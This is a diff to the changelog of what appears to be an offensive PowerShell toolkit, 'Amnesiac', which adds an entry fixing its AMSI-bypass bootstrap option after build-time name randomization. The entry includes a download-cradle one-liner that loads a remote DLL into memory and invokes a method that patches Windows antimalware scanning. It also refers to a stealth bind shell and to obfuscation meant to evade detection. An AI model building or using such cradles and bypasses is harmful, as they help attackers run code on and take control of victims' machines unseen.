@@ -5,6 +5,33 @@ Format: `[LAYER] Change description — *why this matters operationally*`
 
 ---
 
+## [2026-06-03b] feat(bootstrap): add managed-reflection Bypass option + AL-MAP $_alByp/$_alPar
+
+**Problem:** The previous bootstrap `[5]` option called `[AmnesiacLoader.Bypass]::PatchAmsiReflection()`
+using literal class/method names. After `Build.ps1` randomizes all names, those strings no longer exist
+in the compiled assembly — the bypass call silently failed at `.GetType()` returning `$null`.
+
+**Fix:**
+- `AmnesiacLoader/Build.ps1`: `$_alByp` (Bypass class) and `$_alPar` (PatchAmsiReflection method) are now
+  included in the `mapBlock` written to `# !!AL-MAP-BEGIN!!...# !!AL-MAP-END!!` in both PS files.
+- Both `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`: `$_alByp` / `$_alPar` placeholder vars added to the
+  AL-MAP section so they are populated by `Build.ps1` on every build.
+- Bootstrap command updated: old `[5]` (NativeLoader/PAGE_GUARD) becomes `[6]`; new `[5]` generates the
+  correct managed-reflection one-liner using the current build's randomized names:
+  ```
+  $_a=[Reflection.Assembly]::Load((DownloadData('.../<ns>.dll')))
+  $_a.GetType('<ns>.<Bypass>').GetMethod('<PatchAmsiReflection>').Invoke($null,$null)
+  ```
+- `Amnesiac_ShellReady.ps1`: `bootstrap` command handler added (was previously missing from ShellReady).
+- Guard added: if `$_alByp`/`$_alPar` are empty (pre-Build.ps1 run), option `[5]` prints a warning
+  instead of an invalid invocation.
+
+**Operational impact:** After running `AmnesiacLoader\Build.ps1`, `bootstrap` option `[5]` in either
+PS file always generates a working bypass cradle using the current build's randomized DLL class names.
+No more hardcoded `[AmnesiacLoader.Bypass]::PatchAmsiReflection()` that breaks post-randomization.
+
+---
+
 ## [2026-06-03a] fix(ux): full command substitutes download cradle when payload exceeds cmd.exe limit
 
 The stealth bind shell `[2] Full command` option was silently broken for cmd.exe delivery.
